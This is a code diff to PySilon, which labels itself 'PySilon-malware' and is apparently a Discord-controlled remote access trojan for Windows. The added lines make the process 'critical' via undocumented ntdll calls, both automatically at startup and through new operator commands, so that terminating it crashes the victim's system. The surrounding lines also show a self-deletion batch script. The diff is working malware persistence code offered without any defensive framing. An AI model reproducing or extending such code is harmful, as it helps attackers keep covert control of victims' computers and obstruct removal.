@@ -136,6 +136,12 @@ async def on_ready():
 
     if not first_run:
         #.log PySilon is not running for the first time
+        try:
+            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
+        except:
+            pass
+        #.log Raise to critical process
         category_channel_names = []
         for channel in category.channels:
             category_channel_names.append(channel.name)
@@ -344,6 +350,8 @@ async def on_reaction_add(reaction, user):
                     except:
                         #.log Couldn\'t remove recordings directory. Ignoring the error
                         pass
+                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
+                    #.log Unset critical process
                     with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
                         imploder.write(f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{software_executable_name}"\ntimeout /t 3 /nobreak\nrmdir /s /q "C:\\Users\\{getuser()}\\{software_directory_name}"\ndel "%~f0"')
                     #.log Saved implode.bat
@@ -438,9 +446,9 @@ async def on_message(message):
                 sys.exit(0)
                 
             elif message.content[:5] == '.help':
-                #.log Message is "help"
+                
                 await message.delete()
-                #.log Removed the message
+                
                 if message.content.strip() == '.help':
                     #.log Author wants general help
                     embed = discord.Embed(title='List of all available commands', color=0x49fc03)
@@ -448,6 +456,37 @@ async def on_message(message):
                         embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
                     reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                     #.log Sent message with PySilon commands manual
+                
+            elif message.content == '.set-critical':
+                #.log Message is set-critical
+                await message.delete()
+                #.log Removed the message
+                try:
+                    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
+                    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
+                    #.log Set PySilon as a critical process
+                    embed = discord.Embed(title="🟣 System",description=f'```Process elevated to critical status successfully.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent success message
+                except: 
+                    await message.channel.send('`Something went wrong while elevating the process`')
+                    #.log Something went wrong when setting critical process
+
+            elif message.content == '.unset-critical':
+                #.log Message is unset-critical
+                await message.delete()
+                #.log Removed the message
+                try:
+                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
+                    #.log Removed PySilon from critical processes
+                    embed = discord.Embed(title="🟣 System",description=f'```Successfully removed critical status from process.```', colour=discord.Colour.purple())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    #.log Sent success message
+                except: 
+                    await message.channel.send('`Something went wrong while removing critical status`')
+                    #.log Something went wrong when unsetting critical process
 
             elif expectation == 'key':
                 #.log Message is PySilon.key candidate
